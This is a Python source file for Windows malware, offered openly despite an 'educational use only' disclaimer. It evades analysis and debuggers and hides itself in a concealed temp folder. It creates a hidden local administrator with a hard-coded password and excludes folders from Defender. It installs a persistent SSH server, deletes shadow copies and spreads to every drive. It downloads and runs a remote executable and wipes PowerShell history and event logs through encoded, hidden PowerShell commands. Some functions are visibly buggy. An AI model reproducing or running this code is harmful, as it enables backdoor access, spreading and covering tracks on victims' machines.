from time import time       # -Creator: I-DoNt-LiKe-Micro-Soft
start_time = time()         # -Github: https://github.com/I-DoNt-LiKe-Micro-Soft
from os import name         # -Python(3.11)
from sys import exit        # EDUCATIONAL USE ONLY, THIS FILE MUST NOT BE USED FOR MALICIOUS PURPOSES OR EXECUTED ON SOMEONES COMPUTER WITHOUT THEIR CONSENT!
from re import search       # THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGES OR MISUSE OF THIS SOFTWARE!
from subprocess import run as XaWyjqOpBdJsaywqZxVv
from ctypes import windll
from sys import argv
from ctypes import byref
from os import path
from os import environ
from os import remove
from os import mkdir
from shutil import move
from platform import release
from shutil import copy

class AntiAnalysis:
    def __init__(self):
        self.MPPREFERENCE = XaWyjqOpBdJsaywqZxVv(
            "PoWeRsHeLl powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'ZwBFAHQALQBtAFAAYwBPAG0AUAB1AFQAZQByAFMAdABhAHQAVQBzAA=='",
            shell=True, capture_output=True).stdout.decode()
        from ctypes import c_bool
        self.ISDEBUG = c_bool(False)

    def WARNING(self):
        match windll.user32.MessageBoxW(0, "You have executed a virus!. Continue? yes/no", "Info", 0x03):
            case 2:
                exit(1)
            case 7:
                exit(1)

    def OperatingSystemCheck(self):
        match name:
            case "posix":
                exit(1)

    def ReleaseCheck(self):
        match release():
            case "11":
                windll.user32.MessageBoxW(0, "This application is only avaliable for windows-10 operating systems.",
                                          "Error", 0x10), exit(1)
                exit(1)

    def VirtualMachineCheck(self):
        if search("IsVirtualMachine                 : True", self.MPPREFERENCE): exit(1)

    def DebuggerCheck(self):
        windll.kernel32.CheckRemoteDebuggerPresent(windll.kernel32.GetCurrentProcess(), byref(self.ISDEBUG))
        if self.ISDEBUG == True: exit(1)

    def RealTimeProtectionCheck(self):
        if search("RealTimeProtectionEnabled        : True", self.MPPREFERENCE): windll.user32.MessageBoxW(0,
                                                                                                           "Real time protection must be disabled to install dependencies.",
                                                                                                           "Error",
                                                                                                           0x10), exit(1)

    def IsUsrAdmin(self):
        from sys import executable
        if not windll.shell32.IsUserAnAdmin(): windll.shell32.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None), exit(1)


class HideOutCreation:
    def __init__(self):
        self.hideoutpath = environ['temp'] + "\\.0193"
        self.MYCURRENTLOCATION = path.basename(argv[0])

    def PathCreation(self):
        if path.exists(self.hideoutpath) == False: mkdir(self.hideoutpath)
        windll.kernel32.SetFileAttributesW(self.hideoutpath, 2)

    def Hiding(self):
        if path.exists(self.hideoutpath + "\\" + self.MYCURRENTLOCATION): remove(
            self.hideoutpath + "\\" + self.MYCURRENTLOCATION)
        move(self.MYCURRENTLOCATION, self.hideoutpath + "\\" + self.MYCURRENTLOCATION)


def Logging():
    from socket import gethostname
    HOSTNAME = gethostname()
    HOSTNAMESTRING = HOSTNAME
    with open(environ['temp'] + "\\.0193\\Log.txt", "w") as LogFile:
        from time import strftime
        from time import gmtime
        LogFile.write("Date of execution(GMT): " + strftime("%a, %d %b %Y %H:%M:%S +0000", gmtime()) + "\n")
        LogFile.write("Hostname: " + HOSTNAMESTRING + "\n")
        LogFile.write("Username: " + environ['username'] + "\n")
        from platform import architecture
        LogFile.write("Architecture: " + architecture()[0] + "\n")
        from platform import processor
        LogFile.write("Processor: " + processor() + "\n")
        from platform import system
        LogFile.write("System: " + system() + "\n")
        from platform import platform
        LogFile.write("Platform: " + platform() + "\n")
        LogFile.write("Release: " + release() + "\n")
        from platform import version
        LogFile.write("Version: " + version() + ", " + version().split('.')[2] + "\n")
        from platform import machine
        LogFile.write("Machine: " + machine() + "\n")
        from platform import win32_edition
        LogFile.write("Edition: " + win32_edition() + "\n")
        LogFile.close()


def HidingNewAdmin():
    from winreg import CreateKey
    from winreg import HKEY_LOCAL_MACHINE
    KEY = CreateKey(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList")
    from winreg import SetValueEx
    from winreg import REG_DWORD
    SetValueEx(KEY, "defaultuser0", 0, REG_DWORD, 0)
    KEY.Close()

def DisableLua():
    KEY = CreateKey(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU")
    SetValueEx(KEY, "defaultuser0", 0, REG_DWORD, 0)
    KEY.Close()

    
def Payload():
    XaWyjqOpBdJsaywqZxVv("pOWeRsHelL powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'YQBEAGQALQBtAFAAcABSAGUARgBlAFIAZQBOAGMARQAgAC0AZQBYAGMATAB1AFMAaQBPAE4AcABBAHQASAAgACQAZQBuAHYAOgB0AD8APwBwAA=='",
        shell=True)
    # The base64 encoded run command above adds an exclusion to the temp folder using powershell..
    XaWyjqOpBdJsaywqZxVv("poWeRsHeLl powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'YQBEAGQALQB3AEkAbgBEAG8AdwBTAGMAYQBQAGEAYgBpAGwAaQBUAHkAIAAtAE8AbgBMAGkATgBlACAALQBuAEEAbQBFACAAbwBwAEUAbgBTAHMASAAuAHMAZQByAHYAZQByAH4AfgB+AH4AMAAuADAALgAxAC4AMAA7ACAAcwBFAHQALQBzAEUAcgBWAGkAQwBlACAALQBuAEEAbQBFACAAUwBzAEgAZAAgAC0AcwBUAGEAcgBUAHUAUAB0AFkAcABFACAAIgBhAFUAdABPAG0AQQB0AEkAYwAiADsAIABzAFQAYQBSAHQALQBzAEUAcgBWAGkAQwBlACAAcwBTAGgARAA='",
        shell=True)
    # The base64 encoded run command above installs ssh server, starts ssh server and enables automatic ssh server startup using powershell.
    XaWyjqOpBdJsaywqZxVv("POwErsHelL powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'JABQAGEAcwBzAFcAbwByAGQAIAA9ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgAFAAYQBzAHMAVwAwAHIAZAAxAEAAIAAtAEEAcwBQAGwAYQBpAG4AVABlAHgAdAAgAC0ARgBvAHIAYwBlADsAIABOAGUAdwAtAEwAbwBjAGEAbABVAHMAZQByACAALQBOAGEAbQBlACAAZABlAGYAYQB1AGwAdAB1AHMAZQByADAAIAAtAFAAYQBzAHMAdwBvAHIAZAAgACQAUABhAHMAcwBXAG8AcgBkADsAIABBAGQAZAAtAEwAbwBjAGEAbABHAHIAbwB1AHAATQBlAG0AYgBlAHIAIAAtAEcAcgBvAHUAcAAgACIAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACIAIAAtAE0AZQBtAGIAZQByACAAZABlAGYAYQB1AGwAdAB1AHMAZQByADAA'",
        shell=True)
    # The base64 encoded run command above creates a new local admin with the username defaultuser0 and the password PassW0rd1@ using powershell.
    XaWyjqOpBdJsaywqZxVv("PowErSheLl powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'dgBzAHMAYQBkAG0AaQBuAC4AZQB4AGUAIABkAEUAbABFAHQARQAgAHMASABhAEQAbwBXAHMAIAAvAGEATABsACAALwBxAFUASQBlAFQA'",
        shell=True)
    # The base64 encoded run command above removes shadow copies using powershell.
    # -DevNote- Remove the safeboot/secureboot reg key.


class UsbDropper:
    def __init__(self):
        self.DRIVELETTERS = (["A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:",
                             "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "Y:", "X:", "Z:"])
        self.CURRENTHOMEDRIVE = environ["HomeDrive"]  # -Returns HomeDrive windows-10 environment variable
        self.CURRENTSYSTEMDRIVE = environ["SystemDrive"]  # -Returns SystemDrive windows-10 environment variable
        self.MYCURRENTLOCATION = path.basename(argv[0])  # -Returns the name of the current file

    def usbdropper(self):
        if self.CURRENTSYSTEMDRIVE == self.CURRENTHOMEDRIVE:
            self.DRIVELETTERS.remove(self.CURRENTSYSTEMDRIVE)
        else:
            self.DRIVELETTERS.remove(self.CURRENTSYSTEMDRIVE)
            self.DRIVELETTERS.remove(self.CURRENTHOMEDRIVE)
        for Drives in self.DRIVELETTERS:
            try:
                copy(self.MYCURRENTLOCATION, Drives + "\\" + self.MYCURRENTLOCATION)
            except FileNotFoundError:
                pass
            


class HttpDropper:
    def __init__(self):
        self.nameoftheexecutable = "python-3.11.2-amd64.exe"  # -The full name of the executable you are trying to download must go here
        self.url = "http://www.python.org/ftp/python/3.11.2/" + self.nameoftheexecutable  # -The download url must go here excluding the filename
        self.downloadpath = environ["temp"]

    def dropper(self):
        from urllib.request import urlretrieve
        urlretrieve(self.url, r"" + self.downloadpath + "/" + self.nameoftheexecutable)

    def executor(self):
        run("powershell.exe Start-Process " + self.downloadpath + "/" + self.nameoftheexecutable + " -Verb runAs",
            shell=True)


def ClearPsCommandHistory():
    XaWyjqOpBdJsaywqZxVv("pOWERsHelL powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'UgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwBSAGUAYQBkAGwAaQBuAGUATwBwAHQAaQBvAG4AKQAuAEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoAA=='",
        shell=True)
    # The base64 encoded run command above deletes the powershell command history file using powershell.


def ClearingEventViewer():
    XaWyjqOpBdJsaywqZxVv("PoWeRsHElL powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'RwBlAHQALQBXAGkAbgBFAHYAZQBuAHQAIAAtAEwAaQBzAHQATABvAGcAIAAqACAAfAAgAHcAaABlAHIAZQAgAHsAJABfAC4AUgBlAGMAbwByAGQAQwBvAHUAbgB0AH0AIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAALQBQAHIAbwBjAGUAcwBzACAAewAgAFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBSAGUAYQBkAGUAcgAuAEUAdgBlAG4AdABMAG8AZwBTAGUAcwBzAGkAbwBuAF0AOgA6AEcAbABvAGIAYQBsAFMAZQBzAHMAaQBvAG4ALgBDAGwAZQBhAHIATABvAGcAKAAkAF8ALgBMAG8AZwBOAGEAbQBlACkAIAB9AA=='",
        shell=True)
    # The base64 encoded run command above deletes the event viewer logs.


def main():
    ANTIANALYSIS = AntiAnalysis()
    ANTIANALYSIS.OperatingSystemCheck()
    ANTIANALYSIS.ReleaseCheck()
    ANTIANALYSIS.WARNING()
    ANTIANALYSIS.VirtualMachineCheck()
    ANTIANALYSIS.DebuggerCheck()
    ANTIANALYSIS.RealTimeProtectionCheck()
    ANTIANALYSIS.IsUsrAdmin()
    del (ANTIANALYSIS)
    HIDEOUTCREATION = HideOutCreation()
    HIDEOUTCREATION.PathCreation()
    HIDEOUTCREATION.Hiding()
    del (HIDEOUTCREATION)
    from threading import Thread
    LOGGINGTHREAD = Thread(target=Logging())
    LOGGINGTHREAD.start()
    HidingNewAdmin()
    LOGGINGTHREAD.join()
    del (LOGGINGTHREAD)
    Payload()
    USBDROPPER = UsbDropper()
    USBDROPPER.usbdropper()
    del (USBDROPPER)
    HTTPDROPPER = HttpDropper()
    try:
        HTTPDROPPER.dropper()
        HTTPDROPPER.executor()
    except:
        pass
    del (HTTPDROPPER)
    ClearPsCommandHistory()
    ClearingEventViewer()


if __name__ == "__main__": main()

windll.user32.MessageBoxW(0,print("--- %s seconds ---"% (time() - start_time)), 0x40)
